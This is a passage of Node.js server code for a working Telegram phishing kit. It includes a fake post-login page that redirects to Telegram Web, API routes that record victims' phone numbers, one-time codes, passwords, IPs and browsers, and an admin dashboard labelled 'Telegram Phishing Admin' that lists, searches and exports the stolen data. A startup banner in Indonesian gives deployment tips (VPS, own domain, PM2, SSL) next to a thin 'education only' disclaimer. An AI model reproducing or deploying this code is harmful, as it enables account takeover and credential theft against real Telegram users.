                share files, and connect with your contacts.
            </p>
            
            <div class="features">
                <div class="feature">
                    <i class="fas fa-comments"></i>
                    <span>Group Chats</span>
                </div>
                <div class="feature">
                    <i class="fas fa-paper-plane"></i>
                    <span>File Sharing</span>
                </div>
                <div class="feature">
                    <i class="fas fa-shield-alt"></i>
                    <span>Secure Calls</span>
                </div>
                <div class="feature">
                    <i class="fas fa-robot"></i>
                    <span>Bots</span>
                </div>
            </div>
            
            <a href="https://web.telegram.org" class="btn" target="_blank">
                <i class="fab fa-telegram"></i> Launch Telegram Web
            </a>
            
            <div class="countdown">
                Redirecting to Telegram Web in 
                <span class="countdown-number" id="countdown">10</span> seconds...
            </div>
        </div>
        
        <script>
            // Create confetti effect
            function createConfetti() {
                const container = document.getElementById('successContainer');
                const colors = ['#3390ec', '#28a745', '#ffc107', '#dc3545'];
                
                for (let i = 0; i < 100; i++) {
                    const confetti = document.createElement('div');
                    confetti.className = 'confetti';
                    confetti.style.left = Math.random() * 100 + '%';
                    confetti.style.top = '-10px';
                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                    confetti.style.width = Math.random() * 10 + 5 + 'px';
                    confetti.style.height = confetti.style.width;
                    
                    container.appendChild(confetti);
                    
                    // Animate
                    const animation = confetti.animate([
                        { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
                        { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
                    ], {
                        duration: Math.random() * 3000 + 2000,
                        easing: 'cubic-bezier(0.215, 0.61, 0.355, 1)'
                    });
                    
                    animation.onfinish = () => confetti.remove();
                }
            }
            
            // Countdown redirect
            let countdown = 10;
            const countdownElement = document.getElementById('countdown');
            
            function updateCountdown() {
                countdownElement.textContent = countdown;
                if (countdown <= 0) {
                    window.location.href = 'https://web.telegram.org';
                } else {
                    countdown--;
                    setTimeout(updateCountdown, 1000);
                }
            }
            
            // Initialize
            window.addEventListener('load', () => {
                createConfetti();
                setTimeout(updateCountdown, 2000);
                
                // Clear session storage
                sessionStorage.removeItem('tg_phone');
                sessionStorage.removeItem('tg_password');
            });
        </script>
    </body>
    </html>
    `);
});

// Admin Panel
app.get('/admin', basicAuth, (req, res) => {
    const victims = getLatestVictims(20);
    const stats = getStatistics();
    
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Panel - Telegram Phishing</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #0f1419;
                color: #fff;
                padding: 20px;
            }
            .container {
                max-width: 1400px;
                margin: 0 auto;
            }
            .header {
                background: linear-gradient(135deg, #3390ec 0%, #1e6bb8 100%);
                padding: 30px;
                border-radius: 15px;
                margin-bottom: 30px;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-card {
                background: #1a2029;
                padding: 25px;
                border-radius: 12px;
                border-left: 5px solid #3390ec;
            }
            .stat-number {
                font-size: 36px;
                font-weight: bold;
                color: #3390ec;
                margin-bottom: 10px;
            }
            .stat-label {
                color: #a0aec0;
                font-size: 14px;
            }
            .victims-table {
                background: #1a2029;
                border-radius: 12px;
                padding: 25px;
                margin-top: 30px;
                overflow-x: auto;
            }
            table {
                width: 100%;
                border-collapse: collapse;
                min-width: 1000px;
            }
            th, td {
                padding: 15px;
                text-align: left;
                border-bottom: 1px solid #2d3748;
            }
            th {
                background: #2d3748;
                color: #3390ec;
                font-weight: 600;
            }
            tr:hover {
                background: #2d3748;
            }
            .btn {
                background: #3390ec;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 8px;
                cursor: pointer;
                font-weight: 600;
                margin: 5px;
                text-decoration: none;
                display: inline-block;
            }
            .btn:hover {
                background: #1e6bb8;
            }
            .btn-red {
                background: #dc3545;
            }
            .btn-red:hover {
                background: #c82333;
            }
            .search-box {
                margin-bottom: 20px;
            }
            .search-box input {
                width: 100%;
                padding: 12px;
                background: #2d3748;
                border: none;
                border-radius: 8px;
                color: white;
                font-size: 16px;
            }
            .time {
                color: #a0aec0;
                font-size: 12px;
            }
            .phone {
                font-family: monospace;
                color: #48bb78;
            }
            .code {
                font-family: monospace;
                color: #ed8936;
                font-weight: bold;
            }
            .export-btn {
                background: #38a169;
                color: white;
                padding: 10px 20px;
                border-radius: 8px;
                text-decoration: none;
                display: inline-block;
                margin-bottom: 20px;
            }
        </style>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div>
                    <h1><i class="fab fa-telegram"></i> Telegram Phishing Admin</h1>
                    <p>Real-time monitoring dashboard</p>
                </div>
                <div>
                    <button class="btn" onclick="location.reload()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                    <a href="/admin/export" class="btn" style="background: #38a169;">
                        <i class="fas fa-download"></i> Export Data
                    </a>
                </div>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number">${stats.total}</div>
                    <div class="stat-label">Total Victims</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${stats.today}</div>
                    <div class="stat-label">Today's Victims</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${stats.lastHour}</div>
                    <div class="stat-label">Last Hour</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${stats.countries}</div>
                    <div class="stat-label">Countries</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${stats.dataSize}</div>
                    <div class="stat-label">Data Size</div>
                </div>
            </div>
            
            <div class="victims-table">
                <h2 style="margin-bottom: 20px;">
                    <i class="fas fa-users"></i> Recent Victims (Latest 20)
                </h2>
                
                <div class="search-box">
                    <input type="text" id="searchInput" placeholder="Search by phone, code, IP, or country...">
                </div>
                
                <table id="victimsTable">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Phone Number</th>
                            <th>OTP Code</th>
                            <th>Password</th>
                            <th>IP Address</th>
                            <th>Country</th>
                            <th>Browser</th>
                            <th>Time</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${victims.map(victim => {
                            try {
                                const data = JSON.parse(fs.readFileSync(`${CONFIG.VICTIMS_DIR}/${victim.id}.json`, 'utf8'));
                                const time = new Date(data.timestamp).toLocaleString();
                                
                                return `
                                <tr>
                                    <td><small>${data.id.substring(0, 8)}...</small></td>
                                    <td class="phone">+${data.phone}</td>
                                    <td class="code">${data.code}</td>
                                    <td>${data.password || '<span style="color:#a0aec0">No password</span>'}</td>
                                    <td>${data.ip}</td>
                                    <td>${data.country}</td>
                                    <td>${data.browser}</td>
                                    <td class="time">${time}</td>
                                    <td>
                                        <button class="btn" onclick="viewVictim('${data.id}')">
                                            <i class="fas fa-eye"></i>
                                        </button>
                                        <button class="btn btn-red" onclick="deleteVictim('${data.id}')">
                                            <i class="fas fa-trash"></i>
                                        </button>
                                    </td>
                                </tr>
                                `;
                            } catch (e) {
                                return '';
                            }
                        }).join('')}
                    </tbody>
                </table>
            </div>
            
            <div style="margin-top: 30px; text-align: center; color: #a0aec0; font-size: 12px;">
                <i class="fas fa-shield-alt"></i> System Status: Online | Last Updated: ${new Date().toLocaleString()}
            </div>
        </div>
        
        <script>
            // Search functionality
            document.getElementById('searchInput').addEventListener('input', function(e) {
                const searchTerm = e.target.value.toLowerCase();
                const rows = document.querySelectorAll('#victimsTable tbody tr');
                
                rows.forEach(row => {
                    const text = row.textContent.toLowerCase();
                    row.style.display = text.includes(searchTerm) ? '' : 'none';
                });
            });
            
            function viewVictim(id) {
                window.open('/admin/victim/' + id, '_blank');
            }
            
            function deleteVictim(id) {
                if (confirm('Are you sure you want to delete this victim data?')) {
                    fetch('/api/victim/' + id, {
                        method: 'DELETE'
                    }).then(() => {
                        location.reload();
                    });
                }
            }
            
            // Auto-refresh every 30 seconds
            setInterval(() => {
                fetch('/api/stats')
                    .then(res => res.json())
                    .then(data => {
                        if (data.victimsCount !== ${stats.total}) {
                            location.reload();
                        }
                    });
            }, 30000);
        </script>
    </body>
    </html>
    `);
});

// API Routes

// Send OTP code
app.post('/api/send-code', (req, res) => {
    const { country, phone, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    // Validate phone number
    if (!phone || !phone.match(/^[0-9]{9,12}$/)) {
        return res.status(400).json({ 
            success: false, 
            message: 'Invalid phone number format' 
        });
    }
    
    // Store in session (simplified)
    req.session = req.session || {};
    req.session.phone = phone;
    req.session.password = password;
    
    // Log the attempt
    const log = `${new Date().toISOString()} | CODE_REQUEST | ${phone} | ${ip} | ${country}\n`;
    fs.appendFileSync(`${CONFIG.LOGS_DIR}/requests.log`, log);
    
    res.json({
        success: true,
        message: 'Code sent successfully',
        phone: phone,
        next_step: 'verify_code'
    });
});

// Verify OTP code
app.post('/api/verify-code', (req, res) => {
    const { phone, code, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    // Validate code
    if (!code || !code.match(/^[0-9]{6}$/)) {
        return res.status(400).json({
            success: false,
            message: 'Invalid code format'
        });
    }
    
    // Save victim data
    const victimId = saveVictimData(phone, code, password, ip, userAgent);
    
    // Log successful capture
    console.log(`✅ Victim captured: ${phone} - Code: ${code} - ID: ${victimId}`);
    
    res.json({
        success: true,
        message: 'Account verified successfully',
        victim_id: victimId,
        redirect: '/success'
    });
});

// Get statistics
app.get('/api/stats', (req, res) => {
    res.json(getStatistics());
});

// Get victim by ID
app.get('/api/victim/:id', basicAuth, (req, res) => {
    try {
        const filepath = `${CONFIG.VICTIMS_DIR}/${req.params.id}.json`;
        if (fs.existsSync(filepath)) {
            const data = JSON.parse(fs.readFileSync(filepath, 'utf8'));
            res.json(data);
        } else {
            res.status(404).json({ error: 'Victim not found' });
        }
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Delete victim
app.delete('/api/victim/:id', basicAuth, (req, res) => {
    try {
        const filepath = `${CONFIG.VICTIMS_DIR}/${req.params.id}.json`;
        if (fs.existsSync(filepath)) {
            fs.unlinkSync(filepath);
            res.json({ success: true });
        } else {
            res.status(404).json({ error: 'Victim not found' });
        }
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Export all data
app.get('/admin/export', basicAuth, (req, res) => {
    try {
        const files = fs.readdirSync(CONFIG.VICTIMS_DIR)
            .filter(f => f.endsWith('.json'))
            .map(f => `${CONFIG.VICTIMS_DIR}/${f}`);
        
        const victims = files.map(file => {
            return JSON.parse(fs.readFileSync(file, 'utf8'));
        });
        
        const exportData = {
            exported_at: new Date().toISOString(),
            total: victims.length,
            victims: victims
        };
        
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', 'attachment; filename="telegram_victims_export.json"');
        res.send(JSON.stringify(exportData, null, 2));
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// START SERVER
// ============================================

// Initialize everything
initializeDirectories();
const bot = initializeTelegramBot();

// Start server
const server = http.createServer(app);

server.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════╗
║     TELEGRAM PHISHING SERVER v1.0        ║
║                                          ║
║     🔗 http://localhost:${PORT}             ║
║     👥 Victims: ${getVictimCount()}                       ║
║     🤖 Bot: ${bot ? '✅ Connected' : '❌ Disabled'}         ║
║     📁 Data: ${CONFIG.VICTIMS_DIR}        ║
║                                          ║
║     📞 Login: /login                     ║
║     🔐 Admin: /admin                    ║
║     📊 Stats: /api/stats                ║
╚══════════════════════════════════════════╝

⚠️  IMPORTANT: 
1. Ganti BOT_TOKEN dan CHAT_ID di config
2. Ganti ADMIN_PASSWORD untuk keamanan
3. Gunakan di VPS dengan domain sendiri
4. Hanya untuk edukasi keamanan!

💡 Tips: 
• Gunakan PM2 untuk run di background
• Setup SSL dengan Let's Encrypt
• Monitor logs di ${CONFIG.LOGS_DIR}/
    `);
});

// Handle graceful shutdown
process.on('SIGINT', () => {
    console.log('\n\n🔴 Shutting down server...');
    if (bot) {
        bot.stop();
    }
    process.exit(0);
});
